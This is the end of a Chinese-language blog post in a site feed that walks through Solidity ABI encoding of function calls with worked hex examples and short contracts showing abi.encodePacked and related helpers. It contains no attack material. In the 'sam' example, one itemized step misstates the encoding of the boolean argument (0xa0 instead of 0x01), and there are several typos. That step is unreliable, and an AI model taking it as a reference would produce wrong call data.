&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>对于以上合约使用参数 <strong>69</strong> 和 <strong>true</strong> 去调用 <strong>baz</strong>，一共需要传送 <strong>68</strong> 字节，其函数调用的最终编码为：</p><ul><li>函数选择器：<code>0xcdcd77c0</code>，这源自ASCII格式的 <code>baz(uint32,bool)</code> 签名的 <strong>keccak</strong> 哈希的前 4 字节。</li><li>第一个参数，一个被用 0 值字节补充到 32 字节的 uint32 值 <code>69</code>（hex(69)）：<code>0x0000000000000000000000000000000000000000000000000000000000000045</code>：。</li><li>第二个参数，一个被用 0 值字节补充到 32 字节的 boolean 值 <code>true</code>：<code>0x0000000000000000000000000000000000000000000000000000000000000001</code>：。</li></ul><p>合起来就是:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xcdcd77c000000000000000000000000000000000000000000000000000000000000000450000000000000000000000000000000000000000000000000000000000000001</span><br></pre></td></tr></table></figure></li><li><p>使用<code>dave、ture、[1,2,3]</code>作为参数调用 <strong>sam</strong>，一共需要传送 <strong>292</strong> 字节。</p><ul><li>函数选择器：<code>0xa5643bf2</code>，源自<code>sam(bytes,bool,uint256[])</code>的签名；</li><li>第一个参数（动态类型）的数据部分的位置（从参数编码块开始算起的字节数）：<code>0x0000000000000000000000000000000000000000000000000000000000000060</code>；</li><li>第二个参数（bool 类型的 trure）：<code>0x00000000000000000000000000000000000000000000000000000000000000a0</code>；</li><li>第三个参数（动态类型）的数据部分的位置，由字节数计量，这里是<code>0x0a</code>：<code>0x00000000000000000000000000000000000000000000000000000000000000a0</code>；</li><li>第一个参数的数据部分，以字节数组的元素个数作为开始，这里是<code>4</code>：<code>0x0000000000000000000000000000000000000000000000000000000000000004</code>;</li><li>第一个参数的内容（dave）的 UTF-8 编码（这里等同于ASCII编码），并在低位补0到32字节：<code>0x6461766500000000000000000000000000000000000000000000000000000000</code>;</li><li>第三个参数的数据部分以数组元素的个数开始，这里是<code>3</code>：<code>0x0000000000000000000000000000000000000000000000000000000000000003</code>；</li><li>第三个参数的第一个数组元素，1：<code>0x0000000000000000000000000000000000000000000000000000000000000001</code>;</li><li>第三个参数的第二个数组元素，2：<code>0x0000000000000000000000000000000000000000000000000000000000000002</code>;</li><li>第三个参数的第三个数组元素，3：<code>0x0000000000000000000000000000000000000000000000000000000000000003</code>；</li></ul><p>合起来就是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xa5643bf20000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000464617665000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003</span><br></pre></td></tr></table></figure></li></ul><h6 id="例3："><a href="#例3：" class="headerlink" title="例3："></a>例3：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.16;</span><br><span class="line"></span><br><span class="line">contract Foo &#123;</span><br><span class="line">  function f(uint,uint32[],bytes10,bytes) public pure &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>使用参数<code>(0x123, [0x456, 0x789], &quot;1234567890&quot;, &quot;Hello, world!&quot;)</code>进行对函数<code>f(uint,uint32[],bytes10,bytes)</code>的调用会通过以下方式进行编码：</p><ul><li>函数选择器：<code>0x8be65246</code>;</li><li>第一个参数 <strong>uint</strong>（静态类型），直接存储其 <strong>data</strong>：<code>0x0000000000000000000000000000000000000000000000000000000000000123</code>；</li><li>第二个参数 **uint32 []*<em>（动态类型），先存储其 offset=0x20</em>4（4个参数）：<code>0x0000000000000000000000000000000000000000000000000000000000000080</code>；</li><li>第三个参数 <strong>bytes10</strong> (静态类型)，直接存储其 <strong>data</strong>（先转为 <strong>ASCII</strong> 码，从低位开始补充0到32字节）：<code>0x3132333435363738393000000000000000000000000000000000000000000000</code>；</li><li>第四个参数 <strong>bytes</strong> (动态类型)，先存储其 <strong>offset=0x80+3*0x20</strong>=第一个动态参数的<strong>offset</strong> + 第一个动态参数的数据部分的长度 ：<code>0x00000000000000000000000000000000000000000000000000000000000000e0</code>；</li></ul></li><li><p>在存储完静态类型的 <strong>data</strong> 和动态类型的 <strong>offset</strong> 后，开始存储变长类型的 <strong>length</strong> 和 <strong>data</strong>：</p><ul><li><p>第二个参数的 <strong>length</strong>（两个数组元素）：<code>0x0000000000000000000000000000000000000000000000000000000000000002</code>；</p></li><li><p>第二个参数的第一个数组元素：<code>0x0000000000000000000000000000000000000000000000000000000000000456</code>；</p></li><li><p>第二个参数的第二个数组元素：<code>0x0000000000000000000000000000000000000000000000000000000000000789</code>；</p></li><li><p>第四个参数的 <strong>length</strong>（13 个字节）：<code>0x000000000000000000000000000000000000000000000000000000000000000d</code>；</p></li><li><p>第四个参数的数据部分（需要对 <strong>Hello, World!</strong> 进行编码，如下图）：<code>0x48656c6c6f2c20776f726c642100000000000000000000000000000000000000</code>；</p><p><img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/6.png" alt="6"></p></li></ul></li><li><p>将结果合在一起：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x8be65246</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000123</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000080</span><br><span class="line">  3132333435363738393000000000000000000000000000000000000000000000</span><br><span class="line">  00000000000000000000000000000000000000000000000000000000000000e0</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000002</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000456</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000789</span><br><span class="line">  000000000000000000000000000000000000000000000000000000000000000d</span><br><span class="line">  48656c6c6f2c20776f726c642100000000000000000000000000000000000000 </span><br></pre></td></tr></table></figure></li></ul><h4 id="0x05-ABI函数"><a href="#0x05-ABI函数" class="headerlink" title="0x05 ABI函数"></a>0x05 ABI函数</h4><ul><li><p><code>abi.encodePacked(...) returns (bytes)</code>：对给点参数执行紧打包编码，即</p><ul><li>对函数选择器不进行编码；</li></ul></li><li><p>长度低于32字节的类型，即不会进行补0操作，也不会进行符号扩展；</p><ul><li>动态类型会直接进行编码，并且不包含长度信息。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract AbiTest &#123;</span><br><span class="line">    uint public a = block.difficulty;</span><br><span class="line">    function AbiEncodePacked() public view returns (bytes memory) &#123;</span><br><span class="line">        bytes memory result  = abi.encodePacked(a);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/image-20220423224621777.png" alt="image-20220423224621777"></p></li><li><p><code>abi.encodeWithSelector(bytes4 selector, ...) returns (bytes)</code>：对给定的第二个参数开始的参数进行编码，并以给定的函数选择器作为起始的4字节数据一起返回</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract AbiTest &#123;</span><br><span class="line">    uint public a = block.difficulty;</span><br><span class="line"></span><br><span class="line">    function encodeWithSelector() public  view returns(bytes memory)&#123;</span><br><span class="line">        bytes memory result = abi.encodeWithSelector(this.encodeWithSelector.selector,a);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/image-20220423230914216.png" alt="image-20220423230914216"></p></li><li><p><code>abi.encodeWithSignature(string signature, ...) returns (bytes)</code>:与<code>encodeWithSelector</code>等价</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-Basic-Design&quot;&gt;&lt;a href=&quot;#0x01-Basic-Design&quot; class=&quot;headerlink&quot; title=&quot;0x01 Basic Design&quot;&gt;&lt;/a&gt;0x01 Basic Design&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;AB</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
</feed>
